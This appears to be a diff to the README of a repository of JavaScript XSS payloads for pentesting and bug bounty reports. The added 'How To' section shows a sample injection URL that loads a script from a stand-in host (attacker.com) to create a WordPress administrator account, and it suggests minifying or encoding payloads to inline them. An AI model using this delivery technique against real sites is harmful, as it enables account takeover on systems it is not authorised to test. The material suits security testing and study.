@@ -6,3 +6,17 @@ In this repository you will find a bunch of JavaScript files which can be loaded
 This is perfect for beefing up the severity of a pentest or bug bounty report by demonstrating real security impact.
 
 Pull requests are welcome.
+
+## How To
+
+The simplest way to use these payloads is to host them somewhere and load them into the src attribute of a script tag for your XSS payload like this:
+
+```
+https://example.com/vulnerable.php?param=<script src%3d"http://attacker.com/wordpress_create_admin_user.js"></script>
+```
+
+Alternatively, depending on the context and length of the payload, it can sometimes be [minified](https://javascript-minifier.com/), [encoded](https://eve.gd/2007/05/23/string-fromcharcode-encoder/) and then just included directly.
+
+## Credits
+
+[This article](https://www.shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/) from Shift8 is what inspired me to make this repo. The JS in the article has a couple of minor typos but the concepts are spot on.
